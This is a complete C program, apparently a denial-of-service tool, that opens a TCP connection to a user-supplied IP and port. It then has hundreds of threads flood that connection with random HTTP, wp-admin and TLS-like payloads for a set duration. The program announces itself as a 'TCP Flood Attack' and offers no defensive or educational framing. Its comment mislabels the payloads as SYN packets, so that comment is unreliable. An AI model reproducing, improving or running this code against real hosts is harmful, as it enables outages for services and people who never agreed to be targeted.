#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

volatile int running = 1;
unsigned long long total_packets = 0;
int sock;
struct sockaddr_in dest;

// TCP SYN packets
char *tcp_payloads[] = {
    "GET / HTTP/1.1\r\nHost: \r\n\r\n",
    "POST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
    "HEAD / HTTP/1.1\r\n\r\n",
    "GET /wp-admin HTTP/1.1\r\nHost: \r\n\r\n",
    "\x16\x03\x01\x02\x00\x01\x00\x01\x00",  // TLS handshake
};

int payload_count = sizeof(tcp_payloads) / sizeof(tcp_payloads[0]);

void signal_handler(int sig) {
    running = 0;
    printf("\n✅ Stopped! Packets: %llu\n", total_packets);
    exit(0);
}

void *attack_thread(void *arg) {
    while (running) {
        int idx = rand() % payload_count;
        int len = strlen(tcp_payloads[idx]);
        send(sock, tcp_payloads[idx], len, 0);
        total_packets++;
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    if (argc < 4) {
        printf("TCP Flood: ./tcp_leak <IP> <PORT> <TIME> [THREADS]\n");
        printf("Example: ./tcp_leak 1.1.1.1 80 60 500\n");
        return 1;
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc >= 5) ? atoi(argv[4]) : 500;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = inet_addr(ip);
    
    connect(sock, (struct sockaddr*)&dest, sizeof(dest));
    
    printf("\n🔥 TCP Flood Attack\n🎯 %s:%d\n⏱️ %ds\n🔧 %d threads\n\n", ip, port, duration, threads);
    
    pthread_t t[threads];
    for (int i = 0; i < threads; i++)
        pthread_create(&t[i], NULL, attack_thread, NULL);
    
    sleep(duration);
    running = 0;
    for (int i = 0; i < threads; i++)
        pthread_join(t[i], NULL);
    
    close(sock);
    printf("\n✅ Complete! Packets: %llu\n", total_packets);
    return 0;
}